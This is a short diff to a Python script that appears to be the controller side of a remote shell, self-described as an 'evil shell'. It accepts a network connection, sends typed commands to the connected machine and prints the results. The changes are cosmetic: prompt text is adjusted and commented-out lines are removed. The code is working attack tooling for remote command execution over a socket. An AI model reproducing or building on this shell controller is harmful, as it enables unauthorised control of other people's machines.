@@ -26,23 +26,18 @@ def main():
 
     connect, address = sock.accept()
     
-    # output = connect.recv(BUFFER.decode("UTF-8"))
     print(f"Connected by {address}")
     while True:
         # data = connect.recv(BUFFER).decode("UTF-8")
-        command = input("$")
+        command = input("$ ")
         if command == "":
-            # connect.send("command".encode())
             break
-        print("$ evil shell :3 > **********sending command!!! please wait :3")
+        print("$ sending command")
         connect.send(command.encode())
         output = connect.recv(BUFFER).decode("UTF-8")
         print("$ evil shell :3 > **********print results: ")
         print(output)
         
-        # if len(data) > 0:
-        #     print("Received data: " + data)
-
         
     print("closing connection")
     connect.close()
